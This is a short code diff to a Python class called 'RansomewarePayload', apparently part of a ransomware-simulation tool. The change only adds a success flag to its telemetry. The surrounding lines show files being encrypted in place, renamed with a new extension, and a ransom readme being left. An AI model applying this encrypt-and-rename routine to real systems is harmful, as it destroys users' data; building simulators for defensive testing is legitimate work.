@@ -64,10 +64,10 @@ class RansomewarePayload:
                 LOG.debug(f"Encrypting {filepath}")
                 self._encryptor.encrypt_file_in_place(filepath)
                 self._add_extension(filepath)
-                self._send_telemetry(filepath, "")
+                self._send_telemetry(filepath, True, "")
             except Exception as ex:
                 LOG.warning(f"Error encrypting {filepath}: {ex}")
-                self._send_telemetry(filepath, str(ex))
+                self._send_telemetry(filepath, False, str(ex))
 
         return results
 
@@ -75,8 +75,8 @@ class RansomewarePayload:
         new_filepath = filepath.with_suffix(f"{filepath.suffix}{self._new_file_extension}")
         filepath.rename(new_filepath)
 
-    def _send_telemetry(self, filepath: Path, error: str):
-        encryption_attempt = FileEncryptionTelem((str(filepath), str(error)))
+    def _send_telemetry(self, filepath: Path, success: bool, error: str):
+        encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
         self._telemetry_messenger.send_telemetry(encryption_attempt)
 
     def _leave_readme(self):
